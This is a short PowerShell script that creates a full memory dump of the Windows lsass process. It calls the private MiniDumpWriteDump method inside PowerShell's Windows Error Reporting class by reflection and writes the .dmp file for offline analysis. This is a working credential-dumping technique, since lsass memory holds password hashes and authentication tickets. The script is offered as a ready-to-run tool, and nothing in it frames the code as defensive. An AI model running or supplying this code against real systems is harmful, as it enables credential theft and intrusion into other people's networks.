# Will dump the contents of a process using Windows Error Reporting
# The dump then can be analyzed offline...
# Gather the process ID that you are looking for
$processInfo = (Get-Process -Name lsass)
$prHandle = $processInfo.Handle
$prID = $processInfo.Id
$prName = $processInfo.Name
$prDumpFile = "$PWD\$($prName)_$($prID).dmp"

$winErrorRep = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
$winErrorRepMethods = $winErrorRep.GetNestedType('NativeMethods', 'NonPublic')
$f = [Reflection.BindingFlags] 'NonPublic, Static'
$mWrite = $winErrorRepMethods.GetMethod('MiniDumpWriteDump', $f)
$mDumpFull = [UInt32] 2

$fStream = New-Object IO.FileStream($prDumpFile, [IO.FileMode]::Create)

$r = $mWrite.Invoke($null, @($prHandle, $prID, $fStream.SafeFileHandle, $mDumpFull, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero))

$fStream.Close()

